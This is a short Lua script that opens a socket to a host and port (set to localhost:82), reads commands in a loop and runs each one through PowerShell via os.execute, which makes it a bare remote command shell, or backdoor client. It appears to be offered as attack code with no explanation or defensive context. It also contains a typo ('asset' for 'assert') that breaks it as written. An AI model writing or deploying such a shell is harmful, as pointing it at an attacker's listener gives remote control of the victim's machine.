local socket = require "socket"

function ExecuteCommand(command)
    os.execute('powershell.exe -command "' .. command .. '"')
end

function DisconnectShell()
    os.exit()
end

local host, port = "localhost", 82
local socket = asset(socket.connect(host, port))

while true do
    local data, err = socket:receive()


    if not err then
        print("Received Command: "..data)
        ExecuteCommand(data)
    else

        print("Error receiving data:"..err)
        break
    end
end


DisconnectShell()